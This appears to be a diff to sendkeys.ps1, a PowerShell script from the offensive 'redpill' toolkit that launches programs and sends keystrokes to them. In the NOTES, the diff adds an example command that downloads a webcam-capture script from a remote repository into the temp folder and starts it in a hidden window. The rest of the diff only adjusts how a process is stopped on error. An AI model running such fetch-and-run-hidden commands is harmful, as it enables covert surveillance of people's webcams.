@@ -21,7 +21,8 @@
    abort the execution of the process at a predefined time (-execdelay 'int')
 
 .NOTES
-   This cmdlet as nothing to say untill now ...
+   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/WebCam.py" -OutFile "$Env:TMP\WebCam.py"
+   .\sendkeys.ps1 -program "$Env:TMP\WebCam.py" -sendKey "^{c}" -execdelay "10" -style "hidden"
 
 .Parameter Program
    The program to start (default: $Env:WINDIR\System32\cmd.exe)
@@ -197,11 +198,11 @@ $Null = [WinAp]::ShowWindow($NewProc.MainWindowHandle,3)
 # https://stackoverflow.com/questions/19824799/how-to-send-ctrl-or-alt-any-other-key
 
 #Sendkey
+$OrphanID = $NewProc.ID
 Start-Sleep -Seconds $ExecDelay #Wait for program to start
 [System.Windows.Forms.SendKeys]::SendWait("$SendKey")
 If($?)
 {
-   $OrphanID = $NewProc.ID
    write-host "  + " -ForegroundColor DarkYellow -NoNewline
    write-host "Success, sending key: '" -ForegroundColor DarkGray -NoNewline
    write-host "$SendKey" -ForegroundColor DarkYellow -NoNewline
@@ -214,10 +215,17 @@ If($?)
 }
 Else
 {
-   write-host "x " -ForegroundColor Red -NoNewline
+   write-host "  x " -ForegroundColor Red -NoNewline
    write-host " Error: sending key: '" -ForegroundColor DarkGray -NoNewline
    write-host "$SendKey" -ForegroundColor Red -NoNewline
    write-host "'" -ForegroundColor DarkGray
+
+   write-host "  + " -ForegroundColor Red -NoNewline
+   write-host " Stoping proccess by is PID: '" -ForegroundColor DarkGray -NoNewline
+   write-host "$OrphanID" -ForegroundColor Red -NoNewline
+   write-host "'" -ForegroundColor DarkGray
+
+   Stop-Process -Id "$OrphanID" -Force
 }
 
 write-host "* Exit sendkeys cmdlet execution ..`n" -ForegroundColor Green
